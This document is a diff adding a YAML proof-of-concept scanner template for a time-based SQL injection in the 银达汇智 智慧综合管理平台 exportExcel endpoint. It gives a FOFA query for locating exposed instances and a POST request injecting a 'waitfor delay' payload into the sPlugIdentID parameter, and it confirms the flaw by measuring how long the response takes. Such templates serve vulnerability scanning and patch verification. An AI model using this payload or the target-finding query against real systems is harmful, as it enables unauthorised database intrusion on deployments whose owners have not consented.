@@ -1,0 +1,23 @@
+id: poc-yaml-windor-icmp-exportexcel-sqli
+info:
+  name: 银达汇智 智慧综合管理平台 exportExcel SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 银达汇智 智慧综合管理平台
+  FOFA: 汇智信息 && title==智慧综合管理平台登入
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"智慧综合管理平台登入")
+- method: POST
+  path: /Module/CJGL/Controller/PPlugList.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=exportExcel&sPlugIdentID='waitfor+delay'0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(content_type,"application/vnd") && contains(headers,".xlsx")
+    && duration > t1 && duration < t2
+transport: http
